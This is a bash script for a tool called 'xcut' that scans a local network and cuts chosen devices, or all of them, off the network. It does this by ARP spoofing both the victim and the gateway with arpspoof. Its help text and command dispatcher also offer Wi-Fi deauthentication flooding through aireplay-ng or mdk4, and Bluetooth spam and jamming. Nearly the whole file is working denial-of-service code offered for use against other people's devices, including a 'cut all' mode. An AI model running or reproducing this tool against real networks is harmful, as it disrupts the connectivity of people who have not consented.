#!/bin/bash
# xcut - block devices on your Wi-Fi/LAN using ARP spoofing.
#
#   xcut scan               discover active devices on the subnet
#   xcut list               show last scan results (numbered)
#   xcut cut   <nr|ip|all>  block a device (or everyone except router) off the network
#   xcut stop               restore connectivity to all blocked devices
#
# Needs: iproute2 (ip), dsniff  -> /usr/bin/arpspoof, iputils (ping/arping).
# Elevates itself to root (sudo) for the actions that need raw sockets.

set -u

die() { echo "error: $*" >&2; exit 1; }

# ---- resolve the shared library dir (repo sibling, ~/.local/bin, or PATH) ----
libdir() {
    local self d
    # BASH_SOURCE[0] works both executed and sourced (bats sources this file)
    self="$(realpath "${BASH_SOURCE[0]:-$0}" 2>/dev/null || readlink -f "$0" 2>/dev/null || echo "$0")"
    d="$(dirname "$self")"
    for d in "$d/xcut-lib" "$HOME/.local/bin/xcut-lib" /usr/local/share/xcut/lib; do
        [ -f "$d/deauth.sh" ] && { echo "$d"; return 0; }
    done
    return 1
}
XLIB="$(libdir)" || die "xcut-lib not found (expected deauth.sh in xcut-lib/ next to this script)"

# shellcheck disable=SC1090
. "$XLIB/vendor.sh"
# shellcheck disable=SC1090
. "$XLIB/wifi.sh"
# shellcheck disable=SC1090
. "$XLIB/deauth.sh"

GW=""
DEV=""
MY=""
SUBNET3=""

# cache must live in the SAME place whether the script runs as the user
# (xcut list) or elevated via sudo (scan/cut/deauth), otherwise list/show
# report "no scan results" while the elevated commands see different data.
if [ -n "${SUDO_USER:-}" ] && [ "$SUDO_USER" != "root" ]; then
    REAL_HOME="$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)"
    [ -n "$REAL_HOME" ] || REAL_HOME="$HOME"
else
    REAL_HOME="$HOME"
fi
CACHE_DIR="${XCUT_CACHE_DIR:-$REAL_HOME/.local/share/xcut}"
NETFILE="$CACHE_DIR/hosts.last"
MC6FILE="$CACHE_DIR/hosts6.last"
STATE="$CACHE_DIR/victims"
EXCLUDE="$CACHE_DIR/exclude"

# ---- colored output (auto-off when piped / NO_COLOR set) ----
if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
    C_RED="\e[31m"; C_GREEN="\e[32m"; C_YEL="\e[33m"; C_CYN="\e[36m"; C_OFF="\e[0m"
else
    C_RED=""; C_GREEN=""; C_YEL=""; C_CYN=""; C_OFF=""
fi

json_str() {         # escape a string for JSON output
    printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\t/\\t/g; s/\r//g'
}

# short advisory lock (flock, util-linux) so two xcut instances don't race on
# NETFILE/EXCLUDE rewrites. deliberately NOT used around the long-running
# cut loop - a SIGINT handler must never block on its own lock.
lock_xcut() {
    command -v flock >/dev/null 2>&1 || return 0
    mkdir -p "$CACHE_DIR"
    exec 9>"$CACHE_DIR/.lock"
    flock 9 2>/dev/null
}
unlock_xcut() { command -v flock >/dev/null 2>&1 && flock -u 9 2>/dev/null; }

usage() {
    cat <<'EOF'
xcut - block Wi-Fi/LAN device access using ARP spoofing

usage:
  xcut scan [-w] [--v6] [--json]   scan and list active devices (numbered)
                            -w / --watch     rescan every WATCH_EVERY s (default 15)
                            --v6             also probe IPv6 neighbors (NDP)
                            --json           print the scan as JSON instead
  xcut list [--json]       show last scan list
  xcut status [--json]     show device count, what is blocked, deauth state
  xcut cut  <nr|ip|all>    block one device / ip / every device
  xcut uncut <nr|ip|all>   unblock one device (or all = same as stop)
  xcut stop               restore connectivity to everything

  xcut deauth <nr|ip|all> [iface] KICK device off WiFi and keep it off (monitor
                            mode; auto-picks a USB adapter when one is present;
                            your own WiFi may stutter/drop while active)
  xcut deauth stop        stop deauth, restore your interface
                          (or just press Ctrl+C on the running deauth)

  xcut deauth all envs:
    DEAUTH_SEQ=1 xcut deauth all     attack EVERY band of a dual-band AP one
                            band at a time (built-in iwlwifi only; reconnects
                            wlan0 to each band's SSID, floods, moves on)
    DEAUTH_SEQ_TIME=60     seconds per band in seq mode (default 90)
    DEAUTH_HOP=1 xcut deauth all     channel-hop sibling APs (USB adapter only
                            - crashes iwlwifi firmware)
    DEAUTH_GAP=4 xcut deauth all     raise pause between bursts (gentle mode)
    DEAUTH_GENTLE=1 xcut deauth all  burst loop instead of continuous flood
    DEAUTH_MON=sub xcut deauth all   monitor sub-interface (WiFi stays up;
                            may not transmit on some cards)
    DEAUTH_ENGINE=mdk4 xcut deauth all   use mdk4 engine (MDK4_RATE=20 to lower)

  xcut exclude            list excluded devices (skipped by cut all / deauth all)
  xcut exclude <nr|ip>    add a device to the exclude list
  xcut exclude -<nr|ip>   remove a device from the exclude list

  xcut ble  on|off|conn|jam|scan|burst
                            bluetooth BLE spam / connectable-adv spam /
                            soft-jam / scan

scan envs:
    WATCH_EVERY=30          rescan interval for -w/--watch (default 15)
    SWEEP_PARALLEL=64       concurrent pings in the ping-sweep fallback
EOF
    exit 0
}

scan_once() {
    get_netinfo
    mkdir -p "$CACHE_DIR"
    local tmp i ip mac name rest n
    tmp="$(mktemp)"
    trap 'rm -f "${tmp:-}" 2>/dev/null' RETURN
    echo "Scanning ${SUBNET3}.1-254 via $DEV (router $GW) ..."

    if command -v arp-scan >/dev/null 2>&1; then
        echo "using arp-scan (sees devices that ignore ping)"
        arp-scan --interface "$DEV" --localnet -g 2>/dev/null \
            | awk '$1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $2 ~ /^[0-9a-f:]{17}$/ {sub(/^ +/," ",$3); print $1, $2, substr($0, index($0,$3))}' \
            > "$tmp"
    else
        # ping sweep in bounded batches: 254 parallel pings can trip local
        # ICMP rate limits / pids_max, and some routers silently drop the
        # flood, so cap the concurrency (SWEEP_PARALLEL, default 64).
        n="${SWEEP_PARALLEL:-64}"
        case "$n" in
            ''|*[!0-9]*) n=64 ;;
        esac
        [ "$n" -gt 0 ] || n=64
        echo "using ping sweep + neighbor table (${n} concurrent); better results with arp-scan:"
        echo "  sudo pacman -S arp-scan"
        for i in $(seq 1 254); do
            ( ping -c1 -W1 -i 0.2 "${SUBNET3}.$i" >/dev/null 2>&1 ) &
            [ $(( i % n )) -eq 0 ] && wait
        done
        wait
        sleep 1
        neigh_scan > "$tmp"
    fi

    # passive watch: catch devices that answer ARP late
    for i in 1 2 3; do
        neigh_scan >> "$tmp"
        sleep 2
    done

    if [ "${WANT_V6:-0}" = "1" ]; then
        # stimulate NDP (multicast all-nodes) + record IPv6 link-local neighbors
        command -v ping >/dev/null 2>&1 \
            && ping -6 -q -c 2 -W 1 -I "$DEV" ff02::1 >/dev/null 2>&1
        v6_neigh > "$MC6FILE"
    fi

    # dedupe by MAC, drop router/self, attach vendor/hostname.
    # NOTE: arp-scan's trailing description is the OUI VENDOR, not a hostname
    # (it even says "(Unknown: locally administered)" for randomized MACs) -
    # using it as the name would duplicate the Vendor column. Real names come
    # from getent/avahi below.
    lock_xcut
    : > "$NETFILE"
    sort -u -k2,2 "$tmp" | while read -r ip mac rest; do
        [ "$ip" = "$GW" ] && continue
        [ "$ip" = "$MY" ] && continue
        [ -z "$mac" ] && continue
        name="$(getent hosts "$ip" 2>/dev/null | awk '{print $2; exit}')"
        if [ -z "$name" ] && [ "${XCUT_NAMES:-1}" = "1" ] \
           && command -v avahi-resolve-address >/dev/null 2>&1; then
            name="$(timeout 2 avahi-resolve-address "$ip" 2>/dev/null | awk '{print $2; exit}')"
        fi
        echo "$ip $mac $name"
    done >> "$NETFILE"
    unlock_xcut
    # bash RETURN traps are GLOBAL: leaving one set makes every later function
    # return re-fire it, referencing a dead local -> "unbound variable" under
    # set -u (seen in the wild). Clean up explicitly, and keep the trap string
    # itself null-safe in case this function ever grows an early return.
    rm -f "$tmp"
    trap - RETURN
}

scan() {                 # xcut scan [-w] [--v6] [--json] [--interval=N]
    local a
    WANT_V6=0; WANT_JSON=0; WANT_WATCH=0
    for a in "$@"; do
        case "$a" in
            -w|--watch)      WANT_WATCH=1 ;;
            --v6|-6)         WANT_V6=1 ;;
            --json)          WANT_JSON=1 ;;
            --interval=*)    WATCH_EVERY="${a#*=}" ;;
            "") ;;
            *) die "unknown scan option: $a (see: xcut --help)" ;;
        esac
    done
    if [ "${WANT_JSON:-0}" = "1" ]; then
        scan_once >/dev/null 2>&1
        list_hosts_json
    elif [ "$WANT_WATCH" = "1" ]; then
        watch_scan
    else
        scan_once
        list_hosts
    fi
}

## ---- watch mode: rescan every WATCH_EVERY s, print NEW/GONE diffs ----
watch_scan() {
    local intvl="${WATCH_EVERY:-15}" prev="" cur line n
    [[ "$intvl" =~ ^[0-9]+$ ]] && [ "$intvl" -ge 1 ] || intvl=15
    echo "== watch mode: rescan every ${intvl}s (Ctrl+C to stop) =="
    while :; do
        scan_once
        cur="$(awk '{print $1}' "$NETFILE" 2>/dev/null | sort)"
        if [ -n "$prev" ]; then
            comm -13 <(printf '%s\n' "$prev") <(printf '%s\n' "$cur") | while read -r ip; do
                [ -n "$ip" ] || continue
                line="$(awk -v ip="$ip" '$1==ip{print; exit}' "$NETFILE")"
                echo "  ${C_GREEN}NEW ${C_OFF} $line"
            done
            comm -23 <(printf '%s\n' "$prev") <(printf '%s\n' "$cur") | while read -r ip; do
                [ -n "$ip" ] || continue
                echo "  ${C_RED}GONE${C_OFF} $ip"
            done
        else
            n="$(printf '%s\n' "$cur" | sed '/^$/d' | wc -l)"
            echo "  initial snapshot: $n device(s) (diffs follow)"
        fi
        prev="$cur"
        sleep "$intvl"
    done
}

list_hosts() {
    local i ip mac name v v6 extra
    if [ -s "$NETFILE" ]; then
        printf '%-5s %-16s %-18s %-14s %s\n' "No." "IP" "MAC" "Vendor" "Name / IPv6"
        i=1
        while read -r ip mac name; do
            [ -z "$mac" ] && continue
            v="$(vendor_of "$mac")"
            v="${v:--}"
            v6="$(awk -v m="$mac" '$1==m{print $2; exit}' "$MC6FILE" 2>/dev/null)"
            extra="${name:-?}"
            [ -n "$v6" ] && extra="$extra  [${v6}]"
            printf '%-5d %-16s %-18s %-14s %s\n' "$i" "$ip" "$mac" "$v" "$extra"
            i=$((i+1))
        done < "$NETFILE"
    else
        echo "no scan results -> run: xcut scan"
    fi
    if [ -s "$STATE" ]; then
        echo "== ${C_RED}blocked${C_OFF}:"
        awk '{printf "  %d  %s\n", NR, $1}' "$STATE"
        echo "  uncut with:  xcut uncut <nr|ip|all>"
    fi
}

list_hosts_json() {
    local i=0 sep="" ip mac name v v6
    printf '['
    if [ -s "$NETFILE" ]; then
        while read -r ip mac name; do
            [ -z "$mac" ] && continue
            v="$(vendor_of "$mac")"
            v6="$(awk -v m="$mac" '$1==m{print $2; exit}' "$MC6FILE" 2>/dev/null)"
            printf '%s{"no":%d,"ip":"%s","mac":"%s","ip6":"%s","name":"%s","vendor":"%s"}' \
                "$sep" "$((i+1))" "$(json_str "$ip")" "$(json_str "$mac")" \
                "$(json_str "$v6")" "$(json_str "$name")" "$(json_str "$v")"
            sep=","
            i=$((i+1))
        done < "$NETFILE"
    fi
    echo ']'
}

## ---- status: what is going on right now (no root needed) ----
cmd_status() {
    local n=0 ip mac running=0
    if [ -s "$NETFILE" ]; then
        echo "devices : $(wc -l < "$NETFILE" | tr -d ' ')  (last scan: $(date -r "$NETFILE" '+%a %d %b %H:%M:%S' 2>/dev/null))"
    else
        echo "devices : none (run: xcut scan)"
    fi
    if [ -s "$STATE" ]; then
        echo "${C_RED}blocked${C_OFF} (ARP spoof):"
        while read -r ip; do
            [ -n "$ip" ] || continue
            n=$((n+1))
            mac="$(awk -v ip="$ip" '$1==ip{print $2; exit}' "$NETFILE")"
            printf '  %d  %-16s %-18s %s\n' "$n" "$ip" "${mac:--}" "$(vendor_of "$mac")"
        done < "$STATE"
        [ "$n" = "0" ] && echo "  none"
    else
        echo "blocked : none"
    fi
    pgrep -f "aireplay-ng .*--deauth" >/dev/null 2>&1 && running=1
    pgrep -f "mdk4 .* d -b" >/dev/null 2>&1 && running=1
    [ -s "$CACHE_DIR/deauth.pids" ] && running=1
    if [ "$running" = "1" ]; then
        echo "deauth  : ${C_RED}RUNNING${C_OFF}"
        [ -s "$CACHE_DIR/deauth.list" ] && { echo "  targets:"; sed 's/^/    /' "$CACHE_DIR/deauth.list"; }
    else
        echo "deauth  : not running"
    fi
}

status_json() {
    local sep="" ip mac
    printf '{"devices":'
    [ -s "$NETFILE" ] && printf '%d' "$(wc -l < "$NETFILE" | tr -d ' ')" || printf '0'
    printf ',"blocked":['
    if [ -s "$STATE" ]; then
        while read -r ip; do
            [ -n "$ip" ] || continue
            mac="$(awk -v ip="$ip" '$1==ip{print $2; exit}' "$NETFILE")"
            printf '%s{"ip":"%s","mac":"%s"}' "$sep" "$(json_str "$ip")" "$(json_str "$mac")"
            sep=","
        done < "$STATE"
    fi
    printf '],"deauth":'
    if pgrep -f "aireplay-ng .*--deauth" >/dev/null 2>&1 \
       || pgrep -f "mdk4 .* d -b" >/dev/null 2>&1 \
       || [ -s "$CACHE_DIR/deauth.pids" ]; then
        printf '"running"'
    else
        printf '"stopped"'
    fi
    echo '}'
}

resolve_target() {
    local t="$1"
    case "$t" in
        all) echo "ALL";;
        *[!0-9]*) echo "$t" ;;     # IP or MAC - pass through
        [0-9]*) awk -v n="$t" 'NR==n{print $1; exit}' "$NETFILE" ;;
    esac
}

resolve_blocked() {
    local t="$1"
    case "$t" in
        all) echo "ALL";;
        *[!0-9]*) echo "$t" ;;
        [0-9]*) awk -v n="$t" 'NR==n{print $1; exit}' "$STATE" ;;
    esac
}

require_root() {
    [ "$(id -u)" -ne 0 ] && {
        # sudo strips the environment by default, so DEAUTH_*/MDK4_RATE would
        # silently vanish between "xcut deauth" and the elevated re-exec
        # (observed: DEAUTH_ENGINE=mdk4 ran aireplay instead). Pass them
        # through explicitly as VAR=value arguments.
        local args=() v
        for v in DEAUTH_GAP DEAUTH_ENGINE DEAUTH_BURST MDK4_RATE DEAUTH_HOP DEAUTH_MON DEAUTH_GENTLE DEAUTH_SEQ DEAUTH_SEQ_TIME SWEEP_PARALLEL; do
            [ -n "${!v:-}" ] && args+=("${v}=${!v}")
        done
        exec sudo "${args[@]}" "$0" "$@"
    }
}

require_arpspoof() {
    command -v arpspoof >/dev/null 2>&1 || {
        echo "arpspoof (dsniff) is missing."
        echo "install it with:  sudo pacman -S --noconfirm dsniff"
        exit 1
    }
}

start_poison() {          # $1 = victim IP
    local v="$1"
    grep -qx "$v" "$STATE" 2>/dev/null && { echo "already cut: $v"; return 0; }
    arpspoof -i "$DEV" -t "$v" "$GW" >/dev/null 2>&1 &
    arpspoof -i "$DEV" -t "$GW" "$v" >/dev/null 2>&1 &
    echo "$v" >> "$STATE"
    sleep 0.5
    # exact-match check on OUR two directions: a broad "-f arpspoof -i DEV"
    # pattern also matched the "kill arpspoof" check itself / any other
    # arpspoof on the same iface, so a dead process still read as alive.
    if ! pgrep -f "arpspoof -i $DEV -t $v $GW" >/dev/null 2>&1 \
       && ! pgrep -f "arpspoof -i $DEV -t $GW $v" >/dev/null 2>&1; then
        echo "  arpspoof failed to start for $v"
        return 1
    fi
    echo "cut: $v"
}

cut_target() {
    local t="$1" obj
    obj="$(resolve_target "$t")"
    [ -n "$obj" ] || die "target not found in last scan (run xcut scan)"
    if [ "$obj" = "ALL" ]; then
        echo "== cutting ALL devices (except router $GW, this laptop $MY, and exclusions) =="
        awk -v gw="$GW" -v me="$MY" '$1!=gw && $1!=me{print $1, $2}' "$NETFILE" \
            | while read -r ip mac; do
                if is_excluded "$ip" "$mac"; then echo "  skipped (excluded): $ip"; continue; fi
                start_poison "$ip"
              done
    else
        [ "$obj" = "$MY" ] && die "refusing to cut this laptop ($MY)"
        mac="$(awk -v ip="$obj" '$1==ip{print $2; exit}' "$NETFILE")"
        is_excluded "$obj" "$mac" && die "refusing to cut excluded device $obj (see: xcut exclude)"
        start_poison "$obj"
    fi
    echo "restore with: xcut stop"
}

stop_cut() {
    [ -s "$STATE" ] || { echo "nothing is cut right now"; exit 0; }
    while read -r ip; do
        [ -n "$ip" ] && uncut_target "$ip"
    done < "$STATE"
    rm -f "$STATE"
    echo "done."
}

uncut_target() {          # $1 = victim IP; root
    local ip="$1"
    # arpspoof arms a SIGTERM handler that sometimes stalls forever instead
    # of exiting (observed on this WiFi card), so TERM first, then KILL.
    pkill -f "arpspoof -i $DEV -t $ip $GW" 2>/dev/null
    pkill -f "arpspoof -i $DEV -t $GW $ip" 2>/dev/null
    sleep 0.3
    if pgrep -f "arpspoof -i $DEV -t $ip $GW" >/dev/null 2>&1 \
       || pgrep -f "arpspoof -i $DEV -t $GW $ip" >/dev/null 2>&1; then
        pkill -9 -f "arpspoof -i $DEV -t $ip $GW" 2>/dev/null
        pkill -9 -f "arpspoof -i $DEV -t $GW $ip" 2>/dev/null
    fi
    arping -q -c 3 -A -I "$DEV" "$ip" 2>/dev/null
    arping -q -c 3 -A -I "$DEV" "$GW" 2>/dev/null
    grep -vx "$ip" "$STATE" > "$STATE.tmp" 2>/dev/null && mv "$STATE.tmp" "$STATE"
    echo "uncut: $ip"
}

uncut_cmd() {
    local t="$1" obj
    # missing/empty state file is a clean no-op - not a redirection error
    [ -s "$STATE" ] || { echo "nothing is cut right now"; return 0; }
    obj="$(resolve_blocked "$t")"
    [ -n "$obj" ] || die "blocked list is empty"
    if [ "$obj" = "ALL" ]; then
        while read -r ip; do [ -n "$ip" ] && uncut_target "$ip"; done < "$STATE"
        rm -f "$STATE"
        echo "all restored."
    else
        uncut_target "$obj"
        [ -s "$STATE" ] || echo "all restored."
    fi
}

cmd_ble() {
    local bin home="$HOME/.local/bin"
    [ -r "$home/xcut-ble" ] || home="$(dirname "$(realpath "$0")")"
    exec "$home/xcut-ble" "$@"
}

# ---- exclude (allowlist) ----

to_ip() {   # nr -> ip from NETFILE; else pass ip/mac through unchanged
    if [[ "$1" =~ ^[0-9]+$ ]]; then
        awk -v n="$1" 'NR==n{print $1; exit}' "$NETFILE"
    else
        echo "$1"
    fi
}

is_excluded() {         # $1 = IP, $2 = MAC (may be empty)
    [ -f "$EXCLUDE" ] || return 1
    local ip="$1" mac="${2:-}" line
    while read -r line; do
        [ -z "$line" ] && continue
        [ "$line" = "$ip" ] && return 0
        [ -n "$mac" ] && [ "$line" = "$mac" ] && return 0
    done < "$EXCLUDE"
    return 1
}

cmd_exclude() {
    mkdir -p "$CACHE_DIR"
    local arg="${1:-}" ip
    if [ -z "$arg" ]; then
        if [ -s "$EXCLUDE" ]; then
            echo "excluded devices:"
            while read -r line; do
                [ -n "$line" ] && echo "  - $line"
            done < "$EXCLUDE"
        else
            echo "nothing excluded yet"
        fi
        return
    fi
    if [ "${arg:0:1}" = "-" ]; then
        ip="$(to_ip "${arg:1}")"
        [ -n "$ip" ] || die "no such entry"
        lock_xcut
        [ -f "$EXCLUDE" ] && sed -i "\|^$ip$|d" "$EXCLUDE"
        unlock_xcut
        echo "removed $ip from exclude list"
    else
        ip="$(to_ip "$arg")"
        [ -n "$ip" ] || die "no entry matching '$arg' (run: xcut list)"
        lock_xcut
        grep -qx "$ip" "$EXCLUDE" 2>/dev/null || echo "$ip" >> "$EXCLUDE"
        unlock_xcut
        echo "added $ip to exclude list (skipped by cut all / deauth all)"
    fi
}

main() {
    case "${1:-}" in
        scan)                require_root "$@"; scan "${@:2}" ;;
        list)                [ "${2:-}" = "--json" ] && list_hosts_json || list_hosts ;;
        status)
              if [ "${2:-}" = "--json" ]; then status_json; else cmd_status; fi ;;
        cut)  [ -n "${2:-}" ] || usage
                              require_root "$@"; require_arpspoof; get_netinfo
                              # Ctrl+C / SIGTERM in the middle of a cut-all loop
                              # must restore every victim - no orphaned arpspoof
                              trap 'stop_cut; exit 0' INT TERM
                              cut_target "$2"
                              trap - INT TERM ;;
        stop)                require_root "$@"; require_arpspoof; get_netinfo
                              stop_cut ;;
uncut) [ -n "${2:-}" ] || usage
                              require_root "$@"; require_arpspoof; get_netinfo
                              uncut_cmd "$2" ;;
        deauth) require_root "$@"
              if [ "${2:-}" = "stop" ]; then
                  deauth_stop
              else
                  [ -n "${2:-}" ] || usage
                  get_netinfo
                  if [ "${DEAUTH_SEQ:-0}" = "1" ]; then
                      deauth_seq_run "$2"
                  elif [ "$2" = "all" ] || [[ "$2" =~ ^[0-9]+$ ]] || [[ "$2" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                      deauth_start "$2" "${3:-}"
                  else
                      deauth_start "${3:-all}" "$2"   # "$2" is an iface name
                  fi
              fi ;;
        exclude) require_root "$@"
                              cmd_exclude "${2:-}" ;;
        ble)   require_root "$@"
                              cmd_ble "${@:2}" ;;  # forward all args after "ble"
        *)                   usage ;;
    esac
}

# sourced by tests (bats) to reach the functions without running main()
if [ "${BASH_SOURCE[0]}" = "$0" ]; then
    main "$@"
fi
